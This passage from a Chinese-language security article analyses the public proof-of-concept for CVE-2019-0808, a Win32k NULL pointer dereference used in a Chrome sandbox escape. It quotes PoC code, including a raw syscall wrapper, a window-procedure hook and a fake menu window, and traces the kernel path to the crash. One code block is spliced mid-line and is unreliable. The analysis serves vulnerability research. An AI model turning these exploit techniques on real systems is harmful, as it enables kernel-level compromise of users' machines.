    iMenuCreated++;
    }
由于这是DisplayEventProc()第一次执行，iMenuCreated的值为0，因此代码中的“case
0”将会执行，并通过SendMessageW()将WM_LMOUSEBUTTON窗口消息发送给hWndMain来选择hMenuRoot菜单项(0x5,
0x5)。消息显示在hWndMain的窗口消息队列中之后，iMenuCreated会自增。
hWndMain接下来会处理WM_LMOUSEBUTTON消息，并选择hMenu，最终显示hMenuSub子菜单。接下来会触发第二个EVENT_SYSTEM_MENUPOPUPSTART事件，并再次执行DisplayEventProc()。这一次，iMenuCreated的值变成了1，此时代码会使用SendMessageW()来让鼠标光标移动到桌面的(0x6,
0x6)位置。由于此时的鼠标左键仍处于已点击的状态，所以这样就完成了之前提到的“拖拽”行为。接下来，iMenuCreated又会自增，并在main()中的消息循环中执行下列代码：
    CHAR buf[0x100] = { 0 };
    POINT pt;
    pt.x = 2;
    pt.y = 2;
    …
    if (iMenuCreated >= 1) {
    bOnDraging = TRUE;
    callNtUserMNDragOverSysCall(&pt, buf);
    break;
    }
此时iMenuCreated的值已经变成了2，if语句中的代码将会被执行，并将bOnDraging设置为TRUE，表明拖拽操作已由鼠标完成，然后用POINT结构体pt来调用callNtUserMNDragOverSysCall()。
callNtUserMNDragOverSysCall()是win32k.sys中一个针对系统调用函数NtUserMNDragOver()的封装函数，在Windows
7和Windows 7
SP1中NtUserMNDragOver()的系统调用号为0x11ED。在PoC中，使用了系统调用来从user32.dll中获取NtUserMNDragOver()的地址（因为不同操作系统版本的系统调用号不同），每当user32.dll更新，user32.dll中的导出函数和NtUserMNDragOver()函数都会改变。
    void callNtUserMNDragOverSysCall(LPVOID address1, LPVOID address2) {
    _asm {
    mov eax, 0x11ED
    push address2
    push address1
    mov edx, esp
    int 0x2E
    pop eax
    pop eax
    }
    }
接下来，NtUserMNDragOver()会调用xxxMNFindWindowFromPoint()，并执行xxxSendMessage()来发送一个类型为WM_MN_FINDMENUWINDOWFROMPOINT的用户模式回调。用户模式回调的返回值会使用HMValidateHandle()来检测。
    LONG_PTR __stdcall xxxMNFindWindowFromPoint(tagPOPUPMENU pPopupMenu, UINT pIndex, POINTS screenPt)
    {
    ….
    v6 = xxxSendMessage(
    var_pPopupMenu->spwndNextPopup,
    MN_FINDMENUWINDOWFROMPOINT,
    (WPARAM)&pPopupMenu,
    (unsigned __int16)screenPt.x | ((unsigned int )&screenPt >> 16 message == WM_MN_FINDMENUWINDOWFROMPOINT))
    {
    bIsDefWndProc = FALSE;
    printf(“[] HWND: %p n”, cwp->hwnd);
    SetWindowLongPtr(cwp->hwnd, GWLP_WNDPROC, (ULONG64)SubMenuProc);
    }
    return CallNextHookEx(0, code, wParam, lParam);
这段代码将会修改hWndMain的窗口处理进程，从原来的DefWindowProc()修改为SubMenuProc()。它还会将bIsDefWndProc设置为FALSE，表明hWndMain的窗口处理进程已不再是DefWindowProc()了。
钩子设置好之后，hWndMain的窗口进程将会执行。但是，由于hWndMain的窗口进程修改为了SubMenuProc()，因此执行的将是SubMenuProc()函数，而非原来的DefWindowProc()。
SubMenuProc()首先会检测接收到的消息类型是否为WM_MN_FINDMENUWINDOWFROMPOINT。如果是，SubMenuProc()会调用SetWindowLongPtr()来将hWndMain的窗口进程重新设置为DefWindowProc()，这样hWndMain就可以处理其他额外传入的窗口消息了，也可以防止应用程序无法响应。接下来，SubMenuProc()将会返回hWndFakeMenu，或处理那些使用菜单类字符串创建的窗口。
    LRESULT WINAPI SubMenuProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
    {
    if (msg == WM_MN_FINDMENUWINDOWFROMPOINT)
    {
    SetWindowLongPtr(hwnd, GWLP_WNDPROC, (ULONG)DefWindowProc);
    return (ULONG)hWndFakeMenu;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
    }
由于hWndFakeMenu是一个有效窗口，在对其进行处理时将会调用HMValidateHandle()检测，但很多窗口元素都被设置成了0或NULL，因为CreateWindowEx()会尝试使用无效信息来创建菜单窗口。代码接下来会运行xxxMNFindWindowFromPoint()和xxxMNUpdateDraggingInfo()，调用MNGetpItem()，然后调用MNGetpItemFromIndex()。
接下来，MNGetpItemFromIndex()会尝试访问hWndFakeMenu的spMenu域。但是hWndFakeMenu的spMenu值为NULL，这样就导致了一个空指针引用，如果NULL页面无法正常分配，就会发生内核崩溃。
    tagITEM __stdcall MNGetpItemFromIndex(tagMENU spMenu, UINT pPopupMenu)
    {
    tagITEM result; // eax
    if ( pPopupMenu == -1 || pPopupMenu >= spMenu->cItems ){ // NULL pointer dereference will occur
    // here if spMenu is NULL.
    result = 0;
    else
    result = (tagITEM )spMenu->rgItems + 0x6C * pPopupMenu;
    return result;
    }
## 总结
在这篇文章中，我们详细分析了针对漏洞CVE-2019-0808的漏洞利用PoC代码。文中给出了PoC代码的获取地址，并对其中的关键代码段进行了详细分析，以及漏洞利用关键点，那么在《Windows版“碟中谍”：如何利用Win32k漏洞实现Chrome沙盒逃逸（下）》中，我们将跟大家详细介绍如何利用这个Chrome沙盒漏洞，并详细介绍漏洞利用过程中的每一个步骤，敬请关注安全客。